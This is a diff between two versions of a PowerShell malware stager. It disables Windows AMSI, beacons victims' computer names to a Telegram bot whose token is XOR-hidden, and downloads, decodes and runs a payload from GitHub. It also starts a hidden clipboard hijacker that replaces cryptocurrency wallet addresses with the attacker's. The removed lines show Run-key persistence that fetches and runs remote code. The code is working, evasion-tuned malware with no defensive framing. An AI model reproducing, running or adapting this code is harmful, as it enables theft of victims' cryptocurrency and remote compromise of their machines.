@@ -1,11 +1,9 @@
-# --- [ELITE RESEARCH STAGER v29.6: SIGNATURE BREAK + PRO RESTORED] ---
+# --- [ELITE RESEARCH STAGER v29.7: DOT-SOURCE + DYNAMIC PATH] ---
 
 function Global-Initialize {
     try {
         if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
-        # Fragmented AMSI Bypass to avoid "Fleisnam" detection
-        $m = "System.Management.Automation."; $a = "Amsi"; $u = "Utils"
-        $f = "amsi"; $i = "InitFailed"
+        $m = "System.Management.Automation."; $a = "Amsi"; $u = "Utils"; $f = "amsi"; $i = "InitFailed"
         $ref = [Ref].Assembly.GetType($m+$a+$u)
         if ($ref) { $ref.GetField($f+$i,"NonPublic,Static").SetValue($null,$true) }
     } catch {}
@@ -16,45 +14,38 @@ function Send-Ping {
     $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
     $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
     $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
-    try { 
-        $session = New-Object Net.WebClient
-        $session.DownloadString($url) | Out-Null 
-    } catch {
-        Start-Job -ScriptBlock { (New-Object Net.WebClient).DownloadString($using:url) } | Out-Null
-    }
+    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
 Global-Initialize
-Send-Ping -m "V29.6_DEPLOY_START_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "V29.7_BOOT_ON_$($env:COMPUTERNAME)"
 
 try {
-    # Persistence
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $g1 = "h"+"tt"+"ps://raw.githubu"+"sercontent.com/"
-    $g2 = "adchar2022/test/refs/heads/main/test.ps1"
-    $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('$g1$g2')"""
-    Set-ItemProperty -Path $regPath -Name "WinAudioService" -Value $regCmd
-
-    $dir = "$env:APPDATA\Microsoft\D3D11"
+    # DYNAMIC PATH: Changes every run to avoid path-based blocks
+    $sub = "Intel_Telemetry_$(Get-Random -Max 999)"
+    $dir = Join-Path $env:APPDATA $sub
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $path = Join-Path $dir "D3D11Host.exe"
+    $path = Join-Path $dir "syshost.exe"
 
-    # Download using BITS (more stealthy than WebClient for large files)
-    $source = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $temp = "$env:TEMP\sys_cache.tmp"
+    # Save path to global variable for checking
+    $env:LATEST_PAYLOAD = $path
+
+    # Stealth BITS Download
+    $s = "h"+"tt"+"ps://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $tmp = "$env:TEMP\$(Get-Random).tmp"
     Import-Module BitsTransfer
-    Start-BitsTransfer -Source $source -Destination $temp -Priority High
+    Start-BitsTransfer -Source $s -Destination $tmp -Priority High
     
-    $raw = Get-Content $temp -Raw
+    $raw = Get-Content $tmp -Raw
     $data = [Convert]::FromBase64String($raw.Trim())
     for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
     [IO.File]::WriteAllBytes($path, $data)
-    Remove-Item $temp -Force
+    Remove-Item $tmp -Force
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # Clipper Engine with fragmented strings
-    $C_Engine = @'
+    # Clipper logic remains exactly as per v29.3
+    $C = @'
     Add-Type -AssemblyName System.Windows.Forms
     $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
     while($true) {
@@ -70,11 +61,10 @@ try {
         Start-Sleep -Milliseconds 500
     }
 '@
-    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C_Engine))
-    $p = "power"; $s = "shell.exe"
-    & ($p+$s) -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
+    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
+    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
 
-    Send-Ping -m "V29.6_SUCCESS_FULL"
+    Send-Ping -m "V29.7_SUCCESS_PATH_$sub"
 } catch {
-    Send-Ping -m "V29.6_ERR: $($_.Exception.Message)"
+    Send-Ping -m "V29.7_ERR: $($_.Exception.Message)"
 }
